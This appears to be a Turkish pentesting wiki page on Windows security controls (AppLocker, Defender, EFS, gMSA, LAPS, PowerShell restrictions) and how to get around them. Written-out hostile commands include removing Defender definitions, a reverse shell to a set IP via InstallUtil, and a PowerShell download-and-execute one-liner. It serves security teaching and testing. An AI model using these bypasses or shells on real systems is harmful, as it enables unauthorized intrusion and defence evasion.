# Windows Güvenlik Denetimleri

{{#include ../banners/hacktricks-training.md}}

## AppLocker İlkesi

Uygulama whitelist'i, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya executable'ların listesidir. Amaç, ortamı zararlı malware'lerden ve bir kuruluşun belirli iş ihtiyaçlarıyla uyumlu olmayan onaysız yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **uygulama whitelisting çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** üzerinde kontrol sağlar. Executable'lar, script'ler, Windows installer dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama installer'ları üzerinde **ayrıntılı kontrol** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi** ve belirli dizinlere yazma erişimini **engellemesi yaygındır**, **ancak bunların tümü bypass edilebilir**.

### Kontrol

Hangi dosyaların/uzantıların blacklist/whitelist'e alındığını kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu registry path, AppLocker tarafından uygulanan yapılandırmaları ve policy'leri içerir ve sistemde uygulanan mevcut rule set'ini inceleme olanağı sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **yazılabilir klasörler**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyin çalıştırılmasına izin veriyorsa, bunu **bypass etmek** için kullanabileceğiniz **yazılabilir klasörler** vardır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyaları AppLocker'ı bypass etmek için de kullanılabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz; bu klasöre izin verilir.
- Kuruluşlar ayrıca çoğu zaman **`%System32%\WindowsPowerShell\v1.0\powershell.exe` yürütülebilir dosyasını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi diğer [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) konumlarını unuturlar.
- Sisteme ek yük getirebileceği ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle **DLL enforcement çok nadiren etkinleştirilir**. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- Herhangi bir process içinde **Powershell** kodu çalıştırmak ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Kimlik Bilgileri Depolama

### Security Accounts Manager (SAM)

Yerel kimlik bilgileri bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

**Kimlik bilgileri** (hash'lenmiş olarak), Single Sign-On amacıyla bu alt sistemin **belleğinde** **saklanır**.\
**LSA**, yerel **güvenlik ilkesini** (parola ilkesi, kullanıcı izinleri...), **kimlik doğrulamayı**, **erişim belirteçlerini** ve diğerlerini yönetir.\
LSA, yerel oturum açma için sağlanan kimlik bilgilerini **SAM** dosyasında **kontrol eder** ve bir domain kullanıcısının kimliğini doğrulamak için **domain controller** ile **iletişim kurar**.

**Kimlik bilgileri**, **LSASS process'i** içinde **saklanır**: Kerberos ticket'ları, NT ve LM hash'leri, kolayca çözülebilen parolalar.

### LSA secrets

LSA bazı kimlik bilgilerini diskte saklayabilir:

- Active Directory bilgisayar hesabının parolası (ulaşılamayan domain controller).
- Windows servis hesaplarının parolaları
- Zamanlanmış görevlerin parolaları
- Diğerleri (IIS uygulamalarının parolası...)

### NTDS.dit

Active Directory'nin veritabanıdır. Yalnızca Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus yazılımıdır. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Ancak bu **korumaları bypass etmenin yolları** vardır.

### Kontrol

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (etkin olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Listelemek için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS, **File Encryption Key (FEK)** olarak bilinen **simetrik anahtarı** kullanarak dosyaları şifreleme yoluyla güvence altına alır. Bu anahtar, kullanıcının **public key**'iyle şifrelenir ve şifrelenmiş dosyanın $EFS **alternative data stream**'i içinde saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasına karşılık gelen **private key**, $EFS stream'indeki FEK'in şifresini çözmek için kullanılır. Daha fazla ayrıntıya [buradan](https://en.wikipedia.org/wiki/Encrypting_File_System) ulaşabilirsiniz.

**Kullanıcı başlatmadan gerçekleşen şifre çözme senaryoları** şunları içerir:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir file system'e taşındığında otomatik olarak şifreleri çözülür.
- SMB/CIFS protocol üzerinden network aracılığıyla gönderilen şifrelenmiş dosyaların, transmission öncesinde şifreleri çözülür.

Bu encryption yöntemi, dosyaların sahibi için şifrelenmiş dosyalara **transparent access** sağlar. Ancak yalnızca sahibin password'ünü değiştirmek ve oturum açmak, şifre çözmeye izin vermez.

**Key Takeaways**:

- EFS, kullanıcının public key'iyle şifrelenmiş simetrik bir FEK kullanır.
- Şifre çözme, FEK'e erişmek için kullanıcının private key'ini kullanır.
- FAT32'ye kopyalama veya network üzerinden transmission gibi belirli koşullarda otomatik şifre çözme gerçekleşir.
- Şifrelenmiş dosyalara, owner tarafından ek adım gerekmeksizin erişilebilir.

### Check EFS info

Bir **user**'ın bu **service**'i **used** edip etmediğini şu path'in mevcut olup olmadığını kontrol ederek öğrenin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file>\` kullanarak dosyaya **access** sahibi olan **who** olduğunu kontrol edin  
Bir klasörün içinde `cipher /e` ve `cipher /d` kullanarak tüm dosyaları **encrypt** ve **decrypt** edebilirsiniz

### Decrypting EFS files

#### Being Authority System

Bu yaklaşım, **victim user**'ın host üzerinde bir **process** çalıştırıyor olmasını gerektirir. Böyle bir durum varsa bir `meterpreter` session'ından kullanıcının process token'ını (`incognito`'dan `impersonate_token`) impersonate edebilirsiniz. Alternatif olarak kullanıcının process'ine `migrate` edebilirsiniz.

#### Knowing the User's Password

Mimikatz, kullanıcının certificate ve private key'ini import edebilir, ardından bunları EFS-protected dosyaların şifresini çözmek için kullanabilir.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft, IT infrastructure'larındaki service account'ların yönetimini basitleştirmek için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan geleneksel service account'ların aksine, gMSA'ler daha güvenli ve yönetilebilir bir çözüm sunar:

- **Automatic Password Management**: gMSA'ler, domain veya computer policy'ye göre otomatik olarak değişen, 240 karakterlik karmaşık bir password kullanır. Bu process, Microsoft'un Key Distribution Service (KDC) tarafından yürütülür ve manual password update gereksinimini ortadan kaldırır.
- **Enhanced Security**: Bu account'lar lockout'lara karşı bağışıktır ve interactive login için kullanılamaz; bu da security'lerini artırır.
- **Multiple Host Support**: gMSA'ler birden fazla host arasında paylaşılabilir; bu nedenle birden fazla server üzerinde çalışan service'ler için idealdir.
- **Scheduled Task Capability**: managed service account'ların aksine gMSA'ler scheduled task çalıştırmayı destekler.
- **Simplified SPN Management**: Computer'ın sAMaccount ayrıntılarında veya DNS name'inde değişiklik olduğunda system, Service Principal Name'i (SPN) otomatik olarak update eder ve SPN management'ı basitleştirir.

gMSA'lerin password'leri LDAP property _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controller'lar (DCs) tarafından her 30 günde bir otomatik olarak resetlenir. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen encrypted data blob biçimindeki bu password, yalnızca authorized administrator'lar ve gMSA'lerin kurulu olduğu server'lar tarafından alınabilir; bu da güvenli bir ortam sağlar. Bu bilgiye erişmek için LDAPS gibi secured connection gerekir veya connection 'Sealing & Secure' ile authenticated olmalıdır.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Bu password'ü [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** ile okuyabilirsiniz.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu gönderide daha fazla bilgi bulabilirsiniz**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Ayrıca, **gMSA**'in **password** bilgisini **read** etmek için **NTLM relay attack** işleminin nasıl gerçekleştirileceğini anlatan bu [web sayfasına](https://cube0x0.github.io/Relaying-for-gMSA/) göz atın.<sup>[[3]](#references)</sup>

## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) üzerinden indirilebilen **Local Administrator Password Solution (LAPS)**, yerel Administrator password'larının yönetilmesini sağlar. **Randomized**, benzersiz ve **düzenli olarak değiştirilen** bu password'lar, Active Directory'de merkezi olarak depolanır. Bu password'lara erişim, ACL'ler aracılığıyla yetkili kullanıcılarla sınırlandırılır. Yeterli izinler verildiğinde, yerel admin password'larını read etme yeteneği sağlanır.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'i etkili bir şekilde kullanmak için gereken özelliklerin çoğunu **kısıtlar**; örneğin COM nesnelerini engeller, yalnızca onaylanmış .NET türlerine izin verir, XAML tabanlı iş akışlarını, PowerShell sınıflarını ve daha fazlasını kısıtlar.

### **Kontrol**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu Bypass çalışmaz, ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için ihtiyacınız olabilir** **şunları** _**Başvuru Ekle**_ -> _Gözat_ ->_Gözat_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` yolunu ekleyin ve **projeyi .Net4.5 olarak değiştirin**.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodunu **execute** edebilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Çalıştırma İlkesi

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu policy'yi bypass etmenin başlıca yolları:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup> bulabilirsiniz.

## Security Support Provider Interface (SSPI)

Kullanıcıların kimliğini doğrulamak için kullanılabilen API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını görüşür. Bu kimlik doğrulama protokollerine Security Support Provider (SSP) adı verilir, her Windows makinesinin içinde bir DLL olarak bulunurlar ve iletişim kurabilmeleri için her iki makinenin de aynı SSP'yi desteklemesi gerekir.

### Ana SSP'ler

- **Kerberos**: Tercih edilen yöntem
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP için, parola MD5 hash biçiminde
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü görüşmek için kullanılır (Kerberos veya NTLM; varsayılan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Görüşme birkaç yöntem veya yalnızca bir yöntem sunabilir.

## UAC - Kullanıcı Hesabı Denetimi

[Kullanıcı Hesabı Denetimi (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [AppLocker ve PowerShell kısıtlı dil modunu bypass etme](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [EFS dosyalarının şifresini çözme](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA için relay](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy'yi Bypass Etmenin 15 Yolu](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
